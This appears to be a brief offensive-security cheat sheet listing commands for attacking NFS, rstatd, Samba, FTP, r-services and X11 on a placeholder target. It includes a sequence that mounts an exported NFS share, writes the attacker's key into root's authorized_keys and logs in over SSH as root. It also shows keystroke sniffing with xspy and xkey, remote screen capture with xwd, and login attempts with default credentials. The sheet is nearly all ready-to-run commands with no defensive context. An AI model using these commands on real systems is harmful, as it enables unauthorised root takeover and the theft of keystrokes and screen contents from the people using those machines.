# Services

## NFS

Show mount,

```bash
showmount -e <target IP>
```

Mount and access remote host,
```bash
mkdir /tmp/mount
mount -t nfs -o nolock <target IP>:/share /tmp/mount/
cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
umount /tmp/mount
ssh root@<target IP>
```

## Rstatd

```bash
rsysinfo <target IP>
```

## Samba

```bash
smbclient -L //<target IP>
```

## FTP

```bash
ftp admin@<target IP>
user
admin
pwd
```

## Rservices

```bash
rlogin -l root <target IP>
```

## X11

```bash
xspy <target IP>

xwd -display <targetIP>:<display> -root -out file.xwd
xwud -in file.xwd

xkey <targetIP>:0.0 
```
